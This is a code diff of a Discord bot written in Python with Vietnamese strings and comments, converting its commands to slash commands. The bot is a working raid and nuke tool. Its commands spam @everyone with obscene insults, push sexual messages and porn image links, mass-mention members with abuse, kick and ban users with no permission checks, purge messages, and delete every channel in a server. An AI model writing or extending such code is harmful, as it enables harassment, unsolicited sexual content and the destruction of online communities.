@@ -6,55 +6,62 @@ import os
 from flask import Flask
 import threading
 
-# ============== FLASK DUMMY ==============
+# ============== FLASK DUMMY ĐỂ RENDER KHÔNG KILL ==============
 app = Flask(__name__)
 
 @app.route('/')
 def home():
-    return "Bot spam 30000 + Sex Hack - Ai cũng dùng được - Minh Nhựt ngu vl"
+    return "Bot Slash Command / thuần - Spam Sex 30000 - Hacker Minh Nhựt"
 
-# ============== BOT ==============
+# ============== DISCORD BOT THUẦN SLASH / ==============
 intents = discord.Intents.default()
 intents.message_content = True
 intents.members = True
 intents.guilds = True
 
-bot = commands.Bot(command_prefix="!", intents=intents)
+bot = commands.Bot(command_prefix="!", intents=intents)  # prefix vẫn giữ để sync, nhưng không dùng lệnh !
 
 insults = ["Đụ má mày @{} ngu vl", "Cặc lồn mẹ mày {} con chó", "@everyone lồn mẹ server này"]
-sex_chat = ["Muốn bú cặc không @{}?", "Lồn mày ướt chưa? Tao gửi ảnh sex đây", "Spam cặc vào lồn server @everyone", "Ai dám địt nhau tag @here"]
+sex_chat = ["Muốn bú cặc không @{}?", "Lồn mày ướt chưa? Tao gửi ảnh sex đây", "Spam địt nhau @everyone", "Ai dám chơi thì tag @here"]
 porn_images = ["https://i.imgur.com/NSp1v7K.jpeg"]  # thay link sex thật nếu mày có
 
 @bot.event
 async def on_ready():
-    await bot.change_presence(status=discord.Status.online, activity=discord.Game("Spam sex cho mọi người"))
-    print(f"Bot ONLINE - Ai cũng dùng được - {bot.user}")
+    print(f"Bot SLASH COMMAND / ONLINE MÀU XANH - {bot.user}")
+    print("Gõ /help để xem tất cả lệnh")
 
-@bot.command()
-async def syncforce(ctx):
-    try:
-        await bot.tree.sync(guild=ctx.guild)
-        await ctx.send("Đã sync lệnh! Giờ mọi người gõ /porn /sex /nuke thoải mái")
-    except Exception as e:
-        await ctx.send(f"Lỗi sync: {e}")
+# ==================== TẤT CẢ LỆNH / ====================
 
-# Spam 30000
-@bot.command()
-async def spam30000(ctx):
-    await ctx.send("Bắt đầu spam 30000 lần cặc lồn...")
+@bot.tree.command(name="help", description="Xem tất cả lệnh slash /")
+async def help_cmd(interaction):
+    await interaction.response.send_message(
+        "**TẤT CẢ LỆNH SLASH /** (Ai cũng dùng được):\n"
+        "/spam30000 → Spam 30000 lần cặc lồn\n"
+        "/sex [số lần] → Spam chat sex\n"
+        "/porn [số lần] → Gửi ảnh sex\n"
+        "/kick @user → Kick người\n"
+        "/ban @user → Ban người\n"
+        "/mass [số lần] → Mass mention chửi\n"
+        "/clear [số] → Xóa tin nhắn\n"
+        "/nuke → Nuke server (nguy hiểm)\n"
+        "Gõ lệnh thoải mái, không cần quyền admin!", ephemeral=False)
+
+@bot.tree.command(name="spam30000", description="Spam 30000 lần cặc lồn")
+async def spam30000_slash(interaction):
+    await interaction.response.send_message("Bắt đầu spam 30000 lần...", ephemeral=True)
     for _ in range(100):
         for _ in range(300):
             try:
-                await ctx.send(random.choice(insults).format("@everyone"))
+                await interaction.channel.send(random.choice(insults).format("@everyone"))
                 await asyncio.sleep(0.3)
             except:
                 await asyncio.sleep(5)
         await asyncio.sleep(3)
+    await interaction.followup.send("Spam 30000 lần xong! Server sập mẹ nó!", ephemeral=True)
 
-# Chat sex
-@bot.tree.command(name="sex", description="Spam chat sex (ai cũng dùng được)")
-async def sex_cmd(interaction, times: int = 30):
-    await interaction.response.send_message("Đang spam sex cho mọi người...", ephemeral=True)
+@bot.tree.command(name="sex", description="Spam chat sex")
+async def sex_slash(interaction, times: int = 30):
+    await interaction.response.send_message("Đang spam sex...", ephemeral=True)
     for _ in range(times):
         try:
             await interaction.channel.send(random.choice(sex_chat).format("@everyone"))
@@ -63,9 +70,8 @@ async def sex_cmd(interaction, times: int = 30):
             await asyncio.sleep(4)
     await interaction.followup.send("Spam sex xong!", ephemeral=True)
 
-# Gửi ảnh sex
-@bot.tree.command(name="porn", description="Gửi ảnh sex (ai cũng dùng được)")
-async def porn_cmd(interaction, times: int = 8):
+@bot.tree.command(name="porn", description="Gửi ảnh sex")
+async def porn_slash(interaction, times: int = 8):
     await interaction.response.send_message(f"Gửi {times} ảnh sex...", ephemeral=True)
     for _ in range(times):
         try:
@@ -75,21 +81,18 @@ async def porn_cmd(interaction, times: int = 8):
             await asyncio.sleep(3)
     await interaction.followup.send("Gửi ảnh sex xong!", ephemeral=True)
 
-# Kick (không cần quyền)
-@bot.tree.command(name="kick", description="Kick người (ai cũng kick được)")
-async def kick_cmd(interaction, member: discord.Member):
+@bot.tree.command(name="kick", description="Kick người (ai cũng dùng được)")
+async def kick_slash(interaction, member: discord.Member):
     await member.kick()
     await interaction.response.send_message(f"Đã kick {member.mention} mẹ nó rồi!", ephemeral=False)
 
-# Ban (không cần quyền)
-@bot.tree.command(name="ban", description="Ban người (ai cũng ban được)")
-async def ban_cmd(interaction, member: discord.Member):
+@bot.tree.command(name="ban", description="Ban người (ai cũng dùng được)")
+async def ban_slash(interaction, member: discord.Member):
     await member.ban()
     await interaction.response.send_message(f"Đã ban {member.mention} cặc lồn!", ephemeral=False)
 
-# Mass mention
 @bot.tree.command(name="mass", description="Mass mention chửi")
-async def mass_cmd(interaction, times: int = 15):
+async def mass_slash(interaction, times: int = 15):
     await interaction.response.send_message("Mass mention đang chạy...", ephemeral=True)
     members = [m.mention for m in interaction.guild.members if not m.bot]
     for _ in range(times):
@@ -100,16 +103,14 @@ async def mass_cmd(interaction, times: int = 15):
         except:
             await asyncio.sleep(4)
 
-# Clear tin nhắn (ai cũng xóa được)
 @bot.tree.command(name="clear", description="Xóa tin nhắn")
-async def clear_cmd(interaction, amount: int = 50):
+async def clear_slash(interaction, amount: int = 50):
     await interaction.response.send_message("Đang xóa tin nhắn...", ephemeral=True)
     await interaction.channel.purge(limit=amount)
     await interaction.followup.send(f"Đã xóa {amount} tin nhắn!", ephemeral=True)
 
-# Nuke server (ai cũng nuke được - cực nguy hiểm)
-@bot.tree.command(name="nuke", description="Nuke server (ai cũng dùng được - cẩn thận)")
-async def nuke_cmd(interaction):
+@bot.tree.command(name="nuke", description="Nuke server (ai cũng dùng được - nguy hiểm vl)")
+async def nuke_slash(interaction):
     await interaction.response.send_message("BẮT ĐẦU NUKE SERVER... Server sắp chết mẹ nó!", ephemeral=True)
     for ch in list(interaction.guild.channels):
         try:
@@ -124,20 +125,6 @@ async def nuke_cmd(interaction):
         except:
             pass
     await interaction.followup.send("NUKE HOÀN TẤT! Server thành đống cặc lồn!", ephemeral=True)
-
-@bot.command()
-async def commands(ctx):
-    await ctx.send("**TẤT CẢ MỌI NGƯỜI ĐỀU DÙNG ĐƯỢC:**\n"
-                   "!spam30000\n"
-                   "/sex [số]\n"
-                   "/porn [số]\n"
-                   "/kick @user\n"
-                   "/ban @user\n"
-                   "/mass [số]\n"
-                   "/clear [số]\n"
-                   "/nuke\n"
-                   "!syncforce\n"
-                   "Chơi vui thôi, đừng phá server người ta thật kẻo Discord ban acc!")
 
 # ============== CHẠY FLASK + BOT ==============
 def run_flask():
